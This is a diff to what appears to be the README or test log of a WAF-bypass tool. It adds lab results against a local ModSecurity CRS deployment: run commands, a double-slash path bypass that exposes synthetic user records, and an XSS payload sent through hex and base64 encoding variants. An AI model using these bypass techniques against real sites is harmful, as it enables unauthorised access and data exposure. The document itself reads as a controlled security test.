@@ -165,6 +165,54 @@ $ python3 wafbypass.py -u https://www.wikipedia.org --ciphers ECDHE-RSA-AES128-G
 
 Screenshot: `screenshots/8-tls-knobs.png`.
 
+## 11. Real ModSecurity CRS lab (not a mock WAF)
+
+Containers: `owasp/modsecurity-crs:nginx` in front of the fixture app, with
+one policy rule denying `/users`:
+
+```
+SecRule REQUEST_URI "@beginsWith /users" "id:900001,phase:1,deny,status:403,log"
+```
+
+Direct checks: `/users` -> CRS `403`, `//users` -> app `200` (478 bytes,
+"User Directory").
+
+```
+$ python3 wafbypass.py -u http://127.0.0.1:8080/users --mode path --level 2 -t 2 --repeat 2 --timeout 15
+[*] baseline GET /users -> 403 / 18 bytes  "403 Blocked by WAF"
+[+] SUMMARY variants=13 bypass=8 blocked=0 notfound=3 diff=2 error=0 unstable=0 challenge=0
+[i] stability: 10/10 confirmed
+[+] FINDINGS (baseline 403 -> bypass 200)
+  path      double-slash           403->200 impact=unknown title='User Directory' emails=3 niks=3 phones=3 links=0 sensitive=password,token
+            "User Directory User Directory budi budi.santoso@example.co.id +6281234567890 3274010101900001 ..."
+```
+
+Real WAF, real 403 -> 200 transition, and the disclosed data is reported as
+counts plus a text snippet. The app behind the WAF is the fixture, so emails,
+NIKs and phones are synthetic values; the bypass and the finding extraction
+are the engine's output.
+
+Screenshot: `screenshots/11-crs-users.png`.
+
+## 12. CRS signature sweeps (no policy rule)
+
+`/echo` behind the same CRS, XSS preset, encoding family:
+
+```
+[*] baseline GET /echo?q=%3Cscript%3Ealert(1)%3C/script%3E -> 403 / 548 bytes
+[+] SUMMARY variants=12 bypass=2 blocked=10 notfound=0 diff=0 error=0 unstable=0 challenge=0
+[i] stability: 2/2 confirmed
+[i] impact: payload=2 access=0 unknown=0
+[+] BYPASS rows: encoding/enc-hex(200), encoding/enc-base64(200)
+```
+
+CRS lets hex/base64 through, but the app receives and echoes literal hex or
+base64 — no tag executes. The impact oracle marks these `payload` because the
+response changed, yet the finding shows `emails=0 niks=0 phones=0
+sensitive=-`: a WAF signature gap without an exploit.
+
+Screenshot: `screenshots/10-crs-echo.png`.
+
 ## Residual gaps
 
 * TLS extension order and TLS 1.3 suite selection remain OpenSSL-controlled.
